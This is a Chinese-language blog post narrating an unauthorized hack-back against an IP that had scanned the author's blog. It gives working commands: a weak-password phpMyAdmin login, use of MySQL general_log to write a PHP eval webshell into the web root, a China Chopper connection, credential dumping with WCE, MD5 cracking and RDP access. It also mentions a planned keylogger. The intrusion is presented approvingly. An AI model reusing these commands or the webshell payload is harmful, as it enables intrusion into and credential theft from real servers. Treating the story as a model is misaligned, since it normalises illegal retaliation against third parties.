原创： 冬青 合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

一天下午，我正在得意洋洋的看着我的博客，发现某个IP正在对我的博客进行扫描，对此，你懂得。
对该IP进行扫描，发现开启了3389,3306，80等端口，初步判断是用phpmyadmin，于是在目录下输入默认phpmyadmin，就进入了很熟悉的界面，在尝试了几个弱口令之后便成功登入。

![0YO68cJoWwK](http://si1.go2yd.com/get-image/0YO68cJoWwK)

​

利用phpinfo和登录到界面的信息，可以看到该服务器的相关信息

![0YO68lN8R5E](http://si1.go2yd.com/get-image/0YO68lN8R5E)

​

![0YO68kJYRWq](http://si1.go2yd.com/get-image/0YO68kJYRWq)

​

第一次在导入一句话的时候因为“secure_file_priv”值为NULL，导致失败，后来转换思路利用日志写入上传成功
利用日志写入可写入一句话木马并用菜刀连接上 首先检测一下mysql全局变量的值 命令：SHOWVARIABLES LIKE"general%"

![0YO68kGIL0y](http://si1.go2yd.com/get-image/0YO68kGIL0y)

​

从图可以看出general_log是关闭的，log的存放位置是C:/phpStudy/PHPTutorial/WWW/
我们所要做的就是开启general_log，然后修改日志的保存位置 命令：setglobal general_log = "ON"; SET
globalgeneral_log_file='C:/phpStudy/PHPTutorial/WWW/1.php'

![0YO68kaK0n2](http://si1.go2yd.com/get-image/0YO68kaK0n2)

​

![0YO68iYB4KG](http://si1.go2yd.com/get-image/0YO68iYB4KG)

​

接下来就是插入一句话木马了 命令：select'<?php eval($_POST[hack]);?>';

![0YO68hquu48](http://si1.go2yd.com/get-image/0YO68hquu48)

​

最后关闭日志记录 命令：setglobal general_log = "OFF"; 然后利用菜刀进行连接

![0YO68jtI7TU](http://si1.go2yd.com/get-image/0YO68jtI7TU)

​

判断用户的权限

![0YO68hXijPk](http://si1.go2yd.com/get-image/0YO68hXijPk)

​

上传wce工具进行密码抓取

![0YO68f9kyUC](http://si1.go2yd.com/get-image/0YO68f9kyUC)

​

在相关网站上破解MD5密码

![0YO68g0FWxk](http://si1.go2yd.com/get-image/0YO68g0FWxk)

​

拿到账号和密码之后，因为开启了3389，所以直接连

![0YO68fxKYwy](http://si1.go2yd.com/get-image/0YO68fxKYwy)

​

大致看了一下连接状态，本来想装一个键盘记录器，最后还是算了，一个小站，而且还是云服务器，没啥多大利用的价值。

![0YO68fiSMk4](http://si1.go2yd.com/get-image/0YO68fiSMk4)

​

实操推荐 全面分析中国菜刀及隐藏后门 ：了解中国菜刀的特性及其通信原理、机制，并且学会分析可能隐藏的后门以及其工作原理。
长按下面二维码，或点击“[实验:全面分析中国菜刀及隐藏后门(合天网安实验室)](http://www.hetianlab.com/expc.do?ec=ECIDee9320adea6e062018020614185300001))”，可预览学习（PC端操作最佳哟）

![0YO68ftrzyS](http://si1.go2yd.com/get-image/0YO68ftrzyS)

​

声明：作者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关。

  

